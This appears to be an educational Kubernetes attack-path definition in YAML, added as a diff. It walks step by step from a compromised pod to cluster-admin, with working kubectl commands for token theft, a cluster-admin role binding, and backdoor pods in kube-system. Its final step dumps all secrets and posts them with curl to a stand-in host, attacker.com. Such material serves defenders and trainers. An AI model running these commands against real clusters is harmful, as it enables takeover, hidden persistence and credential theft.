@@ -1,0 +1,175 @@
+title: "Initial Access to Cluster Admin"
+description: "A common attack path demonstrating how an attacker can progress from initial access to full cluster compromise"
+category: "Privilege Escalation"
+kubernetesVersion: "1.20+"
+mitreTechniques:
+  - T1078
+  - T1082
+  - T1543
+  - T1552
+steps:
+  - id: "initial-access"
+    title: "Initial Access via Compromised Pod"
+    description: |
+      The attacker gains initial access through a compromised pod in the cluster. This could be achieved through various methods: exploiting a vulnerable application (e.g., Log4Shell, SSRF, SQL injection leading to RCE), compromised CI/CD pipeline pushing malicious images, or misconfigured exposed services. Once inside the pod, the attacker begins reconnaissance of the Kubernetes environment.
+    type: initial
+    command:
+      - "# Verify we're inside a Kubernetes pod"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
+      - "env | grep KUBERNETES"
+      - ""
+      - "# Check what tools are available"
+      - "which curl wget kubectl"
+      - ""
+      - "# Download kubectl if not present"
+      - "curl -LO https://dl.k8s.io/release/v1.28.0/bin/linux/amd64/kubectl"
+      - "chmod +x kubectl && mv kubectl /tmp/"
+    connections:
+      - "discovery"
+    mitreTechnique: T1190
+
+  - id: "discovery"
+    title: "Cluster Discovery"
+    description: |
+      The attacker enumerates the cluster environment to understand the attack surface. This includes discovering other pods, services, namespaces, and identifying the RBAC configuration. The goal is to map out the cluster topology and identify potential paths to privilege escalation. The API server address is automatically injected into pods via environment variables.
+    type: lateral
+    command:
+      - "# Get API server address"
+      - "echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
+      - ""
+      - "# List pods in current namespace"
+      - "kubectl get pods"
+      - ""
+      - "# List all namespaces (if permitted)"
+      - "kubectl get namespaces"
+      - ""
+      - "# List all pods across namespaces"
+      - "kubectl get pods --all-namespaces"
+      - ""
+      - "# List service accounts"
+      - "kubectl get serviceaccounts --all-namespaces"
+      - ""
+      - "# List roles and cluster roles"
+      - "kubectl get roles,clusterroles --all-namespaces"
+    connections:
+      - "token-theft"
+    mitreTechnique: T1082
+
+  - id: "token-theft"
+    title: "Service Account Token Theft"
+    description: |
+      Every pod in Kubernetes is assigned a service account, and by default, the service account token is mounted into the pod at a well-known path. The attacker extracts this token to authenticate to the Kubernetes API. The token's permissions depend on the RBAC roles bound to the service account. Even default tokens can have dangerous permissions if RBAC is misconfigured.
+    type: lateral
+    command:
+      - "# Read the service account token"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+      - ""
+      - "# Store token for later use"
+      - "export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
+      - ""
+      - "# Get service account name"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
+      - ""
+      - "# Read CA certificate for API verification"
+      - "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+      - ""
+      - "# Test API access with token"
+      - "curl -sk -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces"
+    connections:
+      - "rbac-enumeration"
+    mitreTechnique: T1552
+
+  - id: "rbac-enumeration"
+    title: "RBAC Permission Enumeration"
+    description: |
+      With the stolen service account token, the attacker enumerates their permissions to understand what actions are allowed. The 'kubectl auth can-i' command reveals all permitted operations. The attacker looks for dangerous permissions like creating pods, accessing secrets, binding roles, or escalating privileges. Even seemingly benign permissions can be chained for escalation.
+    type: lateral
+    command:
+      - "# List all permissions for current token"
+      - "kubectl auth can-i --list"
+      - ""
+      - "# Check specific dangerous permissions"
+      - "kubectl auth can-i create pods"
+      - "kubectl auth can-i get secrets"
+      - "kubectl auth can-i create clusterrolebindings"
+      - "kubectl auth can-i '*' '*'"
+      - ""
+      - "# Find role bindings for this service account"
+      - "kubectl get rolebindings,clusterrolebindings -A -o json | jq '.items[] | select(.subjects[]?.name==\"default\") | {name: .metadata.name, role: .roleRef.name}'"
+      - ""
+      - "# Identify overly permissive roles"
+      - "kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs[] | contains(\"*\")) | .metadata.name'"
+    connections:
+      - "privilege-escalation"
+    mitreTechnique: T1069
+
+  - id: "privilege-escalation"
+    title: "Privilege Escalation via ClusterRoleBinding"
+    description: |
+      If the service account has permissions to create or modify ClusterRoleBindings, the attacker can bind any service account (including one they control) to the cluster-admin role. This is a common misconfiguration where developers are given broad RBAC permissions for convenience. Once bound to cluster-admin, the attacker has full control over the entire cluster.
+    type: privilege
+    command:
+      - "# Check if we can create clusterrolebindings"
+      - "kubectl auth can-i create clusterrolebindings"
+      - ""
+      - "# Create a new service account for persistence"
+      - "kubectl create serviceaccount attacker-sa"
+      - ""
+      - "# Bind the service account to cluster-admin"
+      - "kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:attacker-sa"
+      - ""
+      - "# Get the new service account token"
+      - "kubectl create token attacker-sa"
+      - ""
+      - "# Alternative: Bind current SA to cluster-admin"
+      - "kubectl create clusterrolebinding current-pwned --clusterrole=cluster-admin --serviceaccount=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace):default"
+    connections:
+      - "persistence"
+    mitreTechnique: T1078
+
+  - id: "persistence"
+    title: "Establish Persistence"
+    description: |
+      With cluster-admin privileges, the attacker establishes persistence to maintain access even if the original compromised pod is deleted. This includes creating backdoor service accounts, deploying hidden pods in system namespaces, modifying existing deployments to include backdoors, or creating webhooks that grant access to new resources.
+    type: persistence
+    command:
+      - "# Create persistent backdoor service account in kube-system"
+      - "kubectl -n kube-system create serviceaccount maintenance-controller"
+      - "kubectl create clusterrolebinding maintenance-controller --clusterrole=cluster-admin --serviceaccount=kube-system:maintenance-controller"
+      - ""
+      - "# Deploy a hidden backdoor pod"
+      - "kubectl -n kube-system run kube-proxy-helper --image=alpine --command -- sleep infinity"
+      - ""
+      - "# Create a mutating webhook for persistent access"
+      - "# This injects a sidecar into every new pod"
+      - ""
+      - "# Modify existing deployment to include backdoor"
+      - "kubectl patch deployment coredns -n kube-system --type='json' -p='[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/-\", \"value\": {\"name\": \"monitor\", \"image\": \"alpine\", \"command\": [\"sleep\", \"infinity\"]}}]'"
+    connections:
+      - "exfiltration"
+    mitreTechnique: T1543
+
+  - id: "exfiltration"
+    title: "Data Exfiltration"
+    description: |
+      With full cluster access, the attacker exfiltrates sensitive data including all secrets (API keys, database credentials, TLS certificates), ConfigMaps with configuration data, persistent volume contents, and application data. The attacker can access any resource in any namespace, including sensitive system secrets in kube-system.
+    type: exfiltration
+    command:
+      - "# Dump all secrets from all namespaces"
+      - "kubectl get secrets -A -o yaml > all_secrets.yaml"
+      - ""
+      - "# Decode and view specific secrets"
+      - "kubectl get secret database-credentials -o jsonpath='{.data.password}' | base64 -d"
+      - ""
+      - "# Get all ConfigMaps"
+      - "kubectl get configmaps -A -o yaml > all_configmaps.yaml"
+      - ""
+      - "# Access persistent volume data"
+      - "kubectl exec -it data-pod -- tar czf - /data | base64 > exfil.b64"
+      - ""
+      - "# Copy files from pods"
+      - "kubectl cp production/app-pod:/app/config ./stolen_config"
+      - ""
+      - "# Exfiltrate via DNS or HTTPS"
+      - "cat all_secrets.yaml | base64 | curl -X POST -d @- https://attacker.com/exfil"
+    mitreTechnique: T1530
